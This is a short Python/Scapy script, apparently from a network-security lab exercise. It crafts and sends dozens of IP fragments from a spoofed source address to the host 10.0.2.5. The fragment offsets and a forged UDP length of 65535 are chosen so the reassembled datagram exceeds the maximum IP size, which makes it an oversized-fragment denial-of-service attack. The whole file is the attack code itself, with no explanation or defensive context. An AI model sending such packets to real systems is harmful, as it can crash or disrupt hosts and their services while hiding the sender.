from scapy.all import *

ID = 1001
payload = "A" * 1400
payload3 = "B" * 1400

udp = UDP(sport=7070, dport=9090)
udp.len = 65535
ip = IP(src="1.2.3.4", dst="10.0.2.5") 
ip.id = ID
ip.frag = 0
ip.flags = 1
pkt = ip/udp/payload
pkt[UDP].chksum = 0
send(pkt,verbose=0)

offset = 176
for i in range(45):
	ip = IP(src="1.2.3.4", dst="10.0.2.5") 
	ip.id = ID
	ip.frag = offset + i * 175
	ip.flags = 1
	ip.proto = 17
	pkt = ip/payload
	send(pkt,verbose=0)

ip = IP(src="1.2.3.4", dst="10.0.2.5") 
ip.id = ID
ip.frag = 176 + 45 * 175
ip.flags = 0
ip.proto = 17
pkt = ip/payload3
send(pkt,verbose=0)

print("Finish Sending Packets!")